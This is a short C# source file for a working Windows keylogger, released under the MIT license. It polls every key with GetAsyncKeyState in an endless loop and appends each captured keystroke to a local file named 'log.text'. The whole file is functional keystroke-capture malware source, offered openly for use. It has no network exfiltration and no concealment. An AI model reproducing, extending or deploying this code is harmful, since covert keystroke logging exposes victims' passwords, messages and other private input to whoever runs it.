/* KeyLogger
 * Copyright (C) 2018  henkje (henkje@pm.me)
 * 
 * MIT license
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string _Key = string.Empty;

        static void Main()
        {
            int Keys = Enum.GetValues(typeof(Keys)).Length;

            while (true)
            {
                //loop evry key (i) and check if the key is pressed, if key is pressed add the key to string _Key
                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);

                //if no key is pressed, wait 50 miliseconds and then continue
                //if you see to many cpu usage, increase 50
                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }

                //key is pressed, continue
                //remove LButton and RButton, these are mouse clicks
                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
                if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }

                _Key = _Key.Replace("Enter", Environment.NewLine);//replace Enter for a new line
                _Key = _Key.Replace("Space", " ");//replace Spave for a space

                File.AppendAllText("log.text", _Key);//write key to file
                _Key = string.Empty;//clear key
            }
        }
    }
}
